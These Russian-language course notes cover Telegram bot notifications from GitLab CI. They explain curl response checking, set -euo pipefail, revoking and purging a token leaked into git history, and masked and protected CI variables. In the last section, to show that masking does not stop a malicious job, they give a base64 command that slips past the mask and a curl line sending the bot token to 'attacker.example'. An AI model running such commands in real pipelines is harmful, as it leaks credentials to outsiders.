## Telegram Bot API

1. Создать бота у **@BotFather** → получить токен вида `123456789:AAH…`.
2. Написать боту или добавить его в группу → узнать `chat_id` (через `getUpdates`).
3. Отправка — обычный HTTPS-запрос:

```bash
curl -sS --max-time 10 -X POST \
  "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
  --data-urlencode "chat_id=${TELEGRAM_CHAT_ID}" \
  --data-urlencode "text=${MESSAGE}" \
  --data-urlencode "parse_mode=HTML"
```

| Часть | Зачем |
|---|---|
| `-sS` | без прогресс-бара, но ошибки показывать |
| `--max-time 10` | не висеть, если API недоступен |
| `--data-urlencode` | текст может содержать `&`, `+`, `#` из сообщения коммита — без кодирования запрос сломается |
| `parse_mode=HTML` | `<b>жирный</b>` в тексте |

Ответ: `{"ok":true,…}` или `{"ok":false,"error_code":401,"description":"Unauthorized"}`.

## Найденная ошибка: job зелёный, сообщения нет

Было: ответ `curl` не проверялся, `set -e` не было. Неверный токен → `{"ok":false}` → `curl` вернул 0 → job **зелёный**. Уведомления тихо не работали.

Стало:

```bash
set -euo pipefail
…
RESPONSE=$(curl -sS --max-time 10 -X POST "…" …)
if ! printf '%s' "$RESPONSE" | grep -q '"ok":true'; then
  echo "ERROR: Telegram API rejected the message: ${RESPONSE}" >&2
  exit 1
fi
```

Проверка из README:

```
$ TELEGRAM_BOT_TOKEN=123:fake TELEGRAM_CHAT_ID=1 bash scripts/notify.sh "test"
ERROR: Telegram API rejected the message: {"ok":false,"error_code":401,"description":"Unauthorized"}
```

> `curl` возвращает ненулевой код только при **сетевых** ошибках. HTTP 4xx/5xx — для него успех, если не указать `--fail` (`-f`). Ответ API проверяют отдельно.

## set -euo pipefail

| Флаг | Что делает |
|---|---|
| `-e` | выйти при первой команде с ненулевым кодом |
| `-u` | ошибка при обращении к **неопределённой** переменной (опечатка в имени не превратится в пустую строку) |
| `-o pipefail` | код конвейера `a \| b` — код **первой упавшей** команды, а не только последней |

Без `pipefail` `curl … | grep …` вернёт код `grep`, даже если `curl` упал.

> С `-u` переменная, которой может не быть, читается как `${VAR:-}` — иначе скрипт упадёт на проверке.

## Найденная ошибка: токен в коде и в истории git

В первой версии токен и `chat_id` были вписаны прямо в `notify.sh` и попали в историю git учебного репозитория. Удаление из следующего коммита **не помогает**: старый коммит со строкой остаётся в истории, и её видит любой, у кого есть доступ к репозиторию.

Что сделано и что делают в таких случаях:

1. **Отозвать секрет** у источника (@BotFather → revoke) — это главное: украденный токен становится бесполезным.
2. Переписать историю (`git filter-repo`) или, как в проекте, создать репозиторий заново.
3. Читать секреты только из окружения.

> Сначала отзыв, потом чистка истории. Форки, клоны и кеши могли сохранить старый коммит.

Профилактика: `gitleaks` / `trufflehog` в pre-commit и в CI, GitLab Secret Detection.

### Почему хардкод даже не работал

Строка была вида:

```bash
"https://api.telegram.org/bot${123456:ABC…}/sendMessage"
```

bash прочитал `${123456:ABC…}` как **подстроку позиционного параметра** `$123456` со смещением `ABC…`. Параметра нет — подставилась пустая строка. Проверено: `echo "bot${123456:ABCdef}/send"` → `bot/send`.

## GitLab CI/CD Variables

*Settings → CI/CD → Variables*:

| Флаг | Эффект |
|---|---|
| **Masked** | значение заменяется на `[MASKED]` в логах job |
| **Protected** | переменная доступна только в пайплайнах **защищённых** веток и тегов |
| **Expand variable reference** | раскрывать `$OTHER` внутри значения |
| тип **File** | значение записывается во временный файл, в переменной — путь к нему (для SSH-ключей, kubeconfig) |

В скрипте:

```bash
"${TELEGRAM_BOT_TOKEN:-}"     # пришло из CI/CD Variables
```

### Запасной путь: файл на runner

В учебном GitLab доступа к Variables не было, поэтому:

```bash
SECRETS_FILE="${TELEGRAM_SECRETS_FILE:-/home/gitlab-runner/.secrets/telegram.env}"
if { [ -z "${TELEGRAM_BOT_TOKEN:-}" ] || [ -z "${TELEGRAM_CHAT_ID:-}" ]; } && [ -f "$SECRETS_FILE" ]; then
  source "$SECRETS_FILE"
fi
```

Файл с правами `600` читает только `gitlab-runner`. Но **любой job** на этом runner выполняется от `gitlab-runner` — значит, может прочитать файл (модуль 07).

## Masked — не защита от злоумышленника

Маскировка спасает от **случайной** утечки в лог. Job, которому доступна переменная, может:

```bash
echo "$TELEGRAM_BOT_TOKEN" | base64      # маска не сработает на изменённое значение
curl https://attacker.example/?t=$TELEGRAM_BOT_TOKEN
```

Поэтому секреты делают ещё и **Protected**: в пайплайне из произвольной ветки их просто нет.
